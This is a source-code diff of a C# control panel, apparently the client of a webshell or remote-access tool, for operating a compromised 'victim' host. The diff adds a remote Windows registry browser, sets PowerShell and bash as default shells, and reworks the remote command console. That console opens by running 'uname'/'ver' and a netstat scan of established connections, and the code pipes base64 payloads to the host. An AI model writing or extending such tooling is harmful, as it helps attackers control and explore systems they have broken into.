@@ -32,6 +32,7 @@ namespace Alien
         public clsfnShell m_rShell { get; set; }
         public clsfnDb m_dbMgr { get; init; }
         public clsfnRunScript m_runScript { get; init; }
+        public clsfnReg m_winReg { get; init; }
 
         private WebBrowser m_ctrlInfoBrowser = new WebBrowser();
         private WebBrowser m_ctrlEvalBrowser = new WebBrowser();
@@ -54,6 +55,7 @@ namespace Alien
             m_fileMgr = new clsfnFileMgr(web);
             m_rShell = new clsfnShell(web);
             m_runScript = new clsfnRunScript(web);
+            m_winReg = new clsfnReg(web);
 
             m_dbMgr = new clsfnDb(web, "db.sqlite");
         }
@@ -815,32 +817,35 @@ namespace Alien
 
         async void fnShellInit()
         {
-            textBox3.BackColor = Color.Black;
-            textBox3.ForeColor = m_victim.m_bUnixLike ? Color.Cyan : Color.White;
+            richTextBox1.BackColor = Color.Black;
+            richTextBox1.ForeColor = m_victim.m_bUnixLike ? Color.Cyan : Color.White;
+            richTextBox1.Font = new Font("Consolas", Font.Size);
 
             string szCommand = m_victim.m_bUnixLike ? "uname -a" : "ver";
             await fnShellExecute(szCommand);
 
             string szInitCommand = $"netstat -ano | {(m_victim.m_bUnixLike ? "grep" : "find")} \"ESTABLISHED\"";
-            textBox3.AppendText(szInitCommand);
+            richTextBox1.AppendText(szInitCommand);
         }
 
         async Task fnShellExecute(string szCommand)
         {
             var ret = await m_rShell.fnShellExecute(szCommand);
-            string[] asOutput = ret.szOutput.Split('\n');
+            string[] asOutput = ret.szOutput.Replace("\r\n", "\n").Split('\n');
 
-            textBox3.AppendText(string.Join(Environment.NewLine, asOutput));
-            textBox3.AppendText(Environment.NewLine);
+            richTextBox1.AppendText(string.Join(Environment.NewLine, asOutput));
+            richTextBox1.AppendText(Environment.NewLine);
 
-            string szPrompt = $"{(m_victim.m_bUnixLike ? $"{ret.szCurrentDir}$" : $"{ret.szCurrentDir}>")}";
-            textBox3.AppendText(szPrompt);
-            textBox3.Focus();
+            ret.szCurrentDir = ret.szCurrentDir.Replace("\r\n", "\n").Replace("\n", string.Empty);
 
-            textBox3.SelectionStart = textBox3.Text.Length;
-            textBox3.SelectionLength = 0;
+            string szPrompt = $"{(m_victim.m_bUnixLike ? $"{ret.szCurrentDir}$ " : $"{ret.szCurrentDir}> ")}";
+            richTextBox1.AppendText(szPrompt);
+            richTextBox1.Focus();
 
-            textBox3.Tag = textBox3.Text.Length;
+            richTextBox1.SelectionStart = richTextBox1.Text.Length;
+            richTextBox1.SelectionLength = 0;
+
+            richTextBox1.Tag = richTextBox1.Text.Length;
         }
 
         #endregion
@@ -1012,22 +1017,18 @@ namespace Alien
             ctrls.m_nPromitStart = ctrls.richTextBox.Text.Length;
             ctrls.richTextBox.KeyDown += async (s, e) =>
             {
-                if (e.KeyCode == Keys.Back)
-                {
-                    if (ctrls.richTextBox.SelectionStart <= ctrls.m_nPromitStart)
-                    {
-                        e.SuppressKeyPress = true;
-                    }
-                }
-                else if (e.KeyCode == Keys.Enter)
+                int nPrompt = ctrls.m_nPromitStart;
+
+                if (e.KeyCode == Keys.Enter)
                 {
                     e.SuppressKeyPress = true;
 
-                    string szCommand = ctrls.richTextBox.Text.Substring(ctrls.m_nPromitStart);
+                    string szCmd = ctrls.richTextBox.Text.Substring(nPrompt);
 
                     ctrls.richTextBox.AppendText("\n\n");
 
-                    DataTable dt = await m_dbMgr.fnSqlQuery(config, szCommand);
+                    DataTable dt = await m_dbMgr.fnSqlQuery(config, szCmd);
+
                     if (dt != null)
                     {
                         ctrls.fnPrintTable(dt);
@@ -1036,15 +1037,37 @@ namespace Alien
 
                     ctrls.richTextBox.AppendText(ctrls.m_szPrompt);
                     ctrls.richTextBox.ScrollToCaret();
+
                     ctrls.m_nPromitStart = ctrls.richTextBox.TextLength;
+
+                    return;
+                }
+
+                if (e.KeyCode == Keys.Back && ctrls.richTextBox.SelectionStart <= nPrompt && ctrls.richTextBox.SelectionLength == 0)
+                {
+                    e.SuppressKeyPress = true;
+                    return;
+                }
+
+                if (e.KeyCode == Keys.Delete && ctrls.richTextBox.SelectionStart <= nPrompt && ctrls.richTextBox.SelectionLength == 0)
+                {
+                    e.SuppressKeyPress = true;
+                    return;
+                }
+
+                if (e.Control && e.KeyCode == Keys.V && ctrls.richTextBox.SelectionStart < nPrompt)
+                {
+                    e.SuppressKeyPress = true;
+                    return;
                 }
             };
-            ctrls.richTextBox.SelectionChanged += (s, e) =>
+            ctrls.richTextBox.KeyPress += (s, e) =>
             {
-                if (ctrls.richTextBox.SelectionStart < ctrls.m_nPromitStart)
+                int nPrompt = ctrls.m_nPromitStart;
+                if (ctrls.richTextBox.SelectionStart < nPrompt)
                 {
-                    ctrls.richTextBox.SelectionStart = ctrls.richTextBox.TextLength;
-                }
+                    e.Handled = true;
+                };
             };
         }
 
@@ -1052,6 +1075,38 @@ namespace Alien
         #region Run Code
 
 
+
+        #endregion
+        #region Linux
+
+        #endregion
+        #region Windows
+
+        #region Registry
+
+        private async Task fnRegInit()
+        {
+            listView3.Items.Clear();
+            treeView5.Nodes.Clear();
+            textBox7.Clear();
+
+            listView3.GridLines = true;
+
+            var dicHives = await m_winReg.fnHives();
+
+            TreeNode nodePC = new TreeNode("Computer");
+            treeView5.Nodes.Add(nodePC);
+
+            foreach (string szKey in dicHives.Keys)
+            {
+                TreeNode node = new TreeNode(szKey);
+                nodePC.Nodes.Add(node);
+            }
+
+            nodePC.Expand();
+        }
+
+        #endregion
 
         #endregion
 
@@ -1106,6 +1161,9 @@ namespace Alien
             treeView3.SelectedNode = cdNode;
 
             //Shell
+
+            textBox4.Text = "powershell.exe";
+            textBox6.Text = "/bin/bash";
 
             m_rShell.m_szCurrentDir = fileInit.szCurrentDir;
             fnShellInit();
@@ -1241,6 +1299,9 @@ namespace Alien
 
                 tabControl4.SelectedTab = draggedTab;
             };
+
+            // Windows registry
+            await fnRegInit();
         }
 
         private void frmControlPanel_Load(object sender, EventArgs e)
@@ -1370,31 +1431,7 @@ namespace Alien
             }
         }
 
-        private void textBox3_KeyDown(object sender, KeyEventArgs e)
-        {
-            if (e.KeyCode == Keys.Enter)
-            {
-                if (textBox3.Tag == null)
-                    return;
 
-                int nIdx = (int)textBox3.Tag;
-                string szCommand = textBox3.Text.Substring(nIdx);
-
-                fnShellExecute(szCommand);
-            }
-            else if (e.KeyCode == Keys.Delete || e.KeyCode == Keys.Back)
-            {
-                if (textBox3.Tag == null)
-                    return;
-
-                int nIdx = (int)textBox3.Tag;
-                if (textBox3.SelectionStart <= nIdx)
-                {
-                    textBox3.SelectionStart = nIdx;
-                    e.Handled = true;
-                }
-            }
-        }
 
         private void textBox1_KeyDown(object sender, KeyEventArgs e)
         {
@@ -1402,11 +1439,6 @@ namespace Alien
             {
                 fnFileDirExists(textBox1.Text);
             }
-        }
-
-        private void textBox3_KeyPress(object sender, KeyPressEventArgs e)
-        {
-
         }
 
         //File.NewFolder
@@ -1809,6 +1841,60 @@ namespace Alien
                 await m_rShell.fnPipeWrite(b64Payload);
 
                 textBox5.Text = string.Empty;
+            }
+        }
+
+        private void richTextBox1_SelectionChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private async void richTextBox1_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (richTextBox1.Tag == null)
+                return;
+
+            int nPrompt = (int)richTextBox1.Tag;
+
+            if (e.KeyCode == Keys.Enter)
+            {
+                string cmd = richTextBox1.Text.Substring(nPrompt);
+
+                await fnShellExecute(cmd);
+
+                e.Handled = true;
+                e.SuppressKeyPress = true;
+
+                return;
+            }
+
+            if (richTextBox1.SelectionStart <= nPrompt)
+            {
+                if (e.KeyCode == Keys.Back || e.KeyCode == Keys.Delete || e.KeyCode == Keys.Left || e.KeyCode == Keys.Right)
+                {
+                    e.Handled = true;
+                    e.SuppressKeyPress = true;
+                }
+            }
+
+            if (e.KeyCode == Keys.Back && richTextBox1.SelectionStart <= nPrompt && richTextBox1.SelectionLength == 0)
+            {
+                e.Handled = true;
+                e.SuppressKeyPress = true;
+            }
+        }
+
+        private void richTextBox1_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            if (richTextBox1.Tag == null)
+                return;
+
+            int nPrompt = (int)richTextBox1.Tag;
+
+            if (richTextBox1.SelectionStart < nPrompt)
+            {
+                e.Handled = true;
+                return;
             }
         }
     }
